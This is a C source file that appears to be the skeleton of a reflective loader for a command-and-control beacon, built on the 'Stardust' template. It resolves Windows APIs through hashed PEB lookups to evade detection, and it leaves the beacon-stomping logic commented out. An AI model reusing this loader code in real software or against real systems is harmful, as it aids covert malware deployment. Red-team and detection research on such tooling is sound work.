#include <Common.h>
#include <Constexpr.h>

FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    STARDUST_INSTANCE
    return &(API( __iob_func )()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

FUNC BOOL ResolveApis()
{
    STARDUST_INSTANCE

    // Resolve primary DLLs
    MOD( Ntdll ) = LdrModulePeb( H_MODULE_NTDLL );
    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );

    // Resolve Load Library
    RESOLVE( LoadLibraryA, Kernel32 );

    // Validate pointers
    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API(LoadLibraryA) )
        return FALSE;

    // Resolve other DLLs
    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
    DLL_LIST
    #undef DLL_ENTRY

    // Now resolve all other APIs 
    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
    API_LIST
    #undef API_ENTRY

    return TRUE;
}


FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE
    PCUSTOM_DATA            cData               = { 0 };
    PIMAGE_DOS_HEADER       DOS_Beacon          = { 0 };
    PIMAGE_NT_HEADERS       NT_Beacon           = { 0 };
    PVOID                   Message             = { 0 };

     // Resolve APIs
    if (!ResolveApis())
    {
        return;
    }

    #ifdef DEBUG
    // Setup debug console for processes without a console
    if (API( AllocConsole )())
    {
        HWND cWindows = API( GetConsoleWindow )();
        API( freopen )("CONIN$", "r", stdin);
        API( freopen )("CONOUT$", "w", stderr);
        API( freopen )("CONOUT$", "w", stdout);
        API( ShowWindow )(cWindows, SW_RESTORE);
        API( SetForegroundWindow )(cWindows);
        API( UpdateWindow )(cWindows);
    }
    #endif

    //PVOID myptr = 0x0000010000000000;
    //PRINT("Addition: %p", PADD( myptr, 0x1000) );
    //PRINT("Subtraction: %p", PSUB( myptr, 0x1000 ) );
    //PRINT("Multiple values: %p", PADD( myptr, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000 ) );
    PRINT("In UDRL!");
    // Allocate a CUSTOM_DATA struct to store values in for later
    cData = API( calloc )(1, sizeof(CUSTOM_DATA));
    Instance()->cData = cData;
    PRINT("cData: %p", cData);
    //PRINT("My test message");
    //PRINTB("Here is a test with args: %s and %d", "my argument", 10);

    //Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;

    //
    // pop da message
    //
    //API( MessageBoxW )( NULL, Message, L"Stardust MessageBox", MB_OK );
    
    //cData = API( Instance()->Base.Buffer, Instance()->Base.Length);
    //Instance()->cData = cData;

    //DOS_Beacon = PADD( Instance()->Base.Buffer, Instance()->Base.Length );
    //NT_Beacon = PADD( DOS_Beacon, DOS_Beacon->e_lfanew );

    //// Store size of Beacon and calculate total stomp size
	//cData->szBeacon = NT_Beacon->OptionalHeader.SizeOfImage;
    //cData->szStomp = cData->szBeacon + SZ_SLEEPMASK + SZ_BOF;
}

